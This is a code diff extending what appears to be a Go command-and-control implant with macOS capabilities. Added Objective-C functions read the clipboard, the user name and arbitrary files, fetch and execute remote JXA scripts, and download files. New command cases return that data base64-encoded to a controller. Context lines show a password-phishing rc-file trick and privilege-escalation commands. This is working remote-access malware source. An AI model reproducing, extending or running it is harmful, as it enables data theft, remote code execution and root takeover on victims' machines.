@@ -1,5 +1,152 @@
-package linux
+// +build darwin
 
+package main
+
+func init(){
+    println("darwin")
+}
+
+/*
+#cgo CFLAGS: -g -Wall -x objective-c
+#cgo LDFLAGS: -framework Cocoa -framework OSAKit -framework Foundation -framework AppleScriptObjC
+#include <stdlib.h>
+#include <stdio.h>
+#import <OSAKit/OSAKit.h>
+#import <Cocoa/Cocoa.h>
+#import <Foundation/Foundation.h>
+#import <AppleScriptObjC/AppleScriptObjC.h>
+
+const char*
+whoami() {
+    NSString *userName = NSUserName();
+	const char *output = [userName UTF8String];
+    return output;
+}
+
+const char*
+Clipboard() {
+    NSPasteboard*  myPasteboard  = [NSPasteboard generalPasteboard];
+    NSString* myString = [myPasteboard  stringForType:NSPasteboardTypeString];
+	const char *cstr = [myString UTF8String];
+    return cstr;
+}
+
+const char*
+cat(const char *name) {
+	NSString* filePath = [NSString stringWithUTF8String:name];
+	NSString* fileContents =
+      [NSString stringWithContentsOfFile:filePath
+       encoding:NSUTF8StringEncoding error:nil];
+	const char *cstr = [fileContents UTF8String];
+    return cstr;
+}
+
+const char*
+jxa(const char *s) {
+	NSString *codeString = [NSString stringWithUTF8String:s];
+	NSError *err = nil;
+	NSURL * urlToRequest = [NSURL URLWithString:codeString];
+	if(urlToRequest)
+	{
+		codeString = [NSString stringWithContentsOfURL: urlToRequest
+										encoding:NSUTF8StringEncoding error:&err];
+	}
+	if(!err){
+		NSLog(@"Script Contents::%@",codeString);
+	}
+    OSALanguage *lang = [OSALanguage languageForName:@"JavaScript"];
+    OSAScript *script = [[OSAScript alloc] initWithSource:codeString language:lang];
+	NSDictionary *dict = nil;
+    NSAppleEventDescriptor *res = [script executeAndReturnError:&dict];
+	if ([dict count] > 0) {
+        NSString *result = dict[@"OSAScriptErrorMessageKey"];
+        return [result UTF8String];
+    }
+    NSString* fmtString = [NSString stringWithFormat:@"%@", res];
+    const char *output = [fmtString UTF8String];
+    return output;
+}
+
+const char*
+get(const char *s) {
+	NSString *result = [NSString stringWithUTF8String:s];
+	NSError *err = nil;
+	NSURL * urlToRequest = [NSURL URLWithString:result];
+	if(urlToRequest)
+	{
+		result = [NSString stringWithContentsOfURL: urlToRequest
+										encoding:NSUTF8StringEncoding error:&err];
+	}
+	if(!err){
+		NSLog(@"Result::%@",result);
+	}
+	const char *output = [result UTF8String];
+    return output;
+}
+
+const char*
+curl(const char *s) {
+	NSString *stringURL = [NSString stringWithUTF8String:s];
+	NSString *theFileName = [stringURL lastPathComponent];
+	NSURL  *url = [NSURL URLWithString:stringURL];
+	NSData *urlData = [NSData dataWithContentsOfURL:url];
+	if ( urlData )
+	{
+		NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+		NSString  *documentsDirectory = [paths objectAtIndex:0];
+
+		NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,theFileName];
+		[urlData writeToFile:filePath atomically:YES];
+		const char *output = [filePath UTF8String];
+		return output;
+	}
+	const char *output = [theFileName UTF8String];
+	return output;
+}
+
+int
+AppleScript() {
+NSDictionary* errorDict;
+    NSAppleEventDescriptor* returnDescriptor = NULL;
+
+    NSAppleScript* scriptObject = [[NSAppleScript alloc] initWithSource:
+                @"\
+		set user to do shell script \"whoami >> /tmp/tester\"\n\
+                tell application \"Chrome\"\n\
+                display dialog \"User: \" & user \n\
+                end tell"];
+
+    returnDescriptor = [scriptObject executeAndReturnError: &errorDict];
+    [scriptObject release];
+
+    if (returnDescriptor != NULL)
+    {
+        // successful execution
+        if (kAENullEvent != [returnDescriptor descriptorType])
+        {
+            // script returned an AppleScript result
+            if (cAEList == [returnDescriptor descriptorType])
+            {
+                 // result is a list of other descriptors
+            }
+            else
+            {
+                // coerce the result to the appropriate ObjC type
+            }
+        }
+    }
+    else
+    {
+        // no script result, handle error here
+    }
+return 0;
+}
+
+*/
+/*
+#include <stdlib.h>
+*/
+import "C"
 import (
 	"bufio"
 	"bytes"
@@ -17,6 +164,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unsafe"
 
 	"github.com/lithammer/shortuuid"
 )
@@ -64,7 +212,7 @@ type Cmd struct {
 
 // Update with callback timeout and c2 address
 var timeoutSetting = 1
-var c2 = "https://gostripe.ngrok.io"
+var c2 = "http://127.0.0.1:8005"
 
 // Appends the following set of commands to the users rc files
 // When a new terminal opens the user will be asked to enter their password to complete terminal updates
@@ -206,7 +354,9 @@ func runCommand(commandStr string, cmdid string) error {
 		runJXA(arrCommandStr[1], cmdid)
 		return nil
 	case "clipboard":
-		print("clipboard")
+		clips := C.GoString(C.Clipboard())
+		sEnc := base64.StdEncoding.EncodeToString([]byte(clips))
+		updateCmdStatus(cmdid, sEnc)
 	case "privesc":
 		if len(arrCommandStr) == 1 {
 			data := "Required 1 arguments (privesc type)"
@@ -234,7 +384,62 @@ func runCommand(commandStr string, cmdid string) error {
 		data := "hmmmm"
 		sEnc := base64.StdEncoding.EncodeToString([]byte(data))
 		updateCmdStatus(cmdid, sEnc)
-
+	case "whoami":
+		whoami := C.GoString(C.whoami())
+		sEnc := base64.StdEncoding.EncodeToString([]byte(whoami))
+		updateCmdStatus(cmdid, sEnc)
+	case "jxa":
+		fmt.Println(len(arrCommandStr))
+		if len(arrCommandStr) == 1 {
+			fmt.Println(len(arrCommandStr))
+			data := "Required 1 arguments"
+			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+			updateCmdStatus(cmdid, sEnc)
+			return errors.New("Required 1 arguments")
+		}
+		arg := arrCommandStr[1]
+		data := C.CString(arg)
+		defer C.free(unsafe.Pointer(data))
+		C.jxa(data)
+		out := "JXA executed from: "
+		sEnc := base64.StdEncoding.EncodeToString([]byte(out))
+		updateCmdStatus(cmdid, sEnc)
+	case "applescript":
+		C.AppleScript()
+		out := "Applescript executed from: "
+		sEnc := base64.StdEncoding.EncodeToString([]byte(out))
+		updateCmdStatus(cmdid, sEnc)
+	case "asroot":
+		asroot()
+		out := "Created root entry at: /tmp/temp\nUse privesc TerminalUpdate to setuid"
+		sEnc := base64.StdEncoding.EncodeToString([]byte(out))
+		updateCmdStatus(cmdid, sEnc)
+	case "cat":
+		if len(arrCommandStr) == 1 {
+			data := "Required 1 arguments"
+			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+			updateCmdStatus(cmdid, sEnc)
+			return errors.New("Required 1 arguments")
+		}
+		arg := arrCommandStr[1]
+		name := C.CString(arg)
+		defer C.free(unsafe.Pointer(name))
+		out := C.GoString(C.cat(name))
+		sEnc := base64.StdEncoding.EncodeToString([]byte(out))
+		updateCmdStatus(cmdid, sEnc)
+	case "curl":
+		if len(arrCommandStr) == 1 {
+			data := "Required 1 arguments"
+			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+			updateCmdStatus(cmdid, sEnc)
+			return errors.New("Required 1 arguments")
+		}
+		arg := arrCommandStr[1]
+		url := C.CString(arg)
+		defer C.free(unsafe.Pointer(url))
+		outC := C.GoString(C.curl(url))
+		sEnc := base64.StdEncoding.EncodeToString([]byte(outC))
+		updateCmdStatus(cmdid, sEnc)
 	default:
 		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
 		var out bytes.Buffer
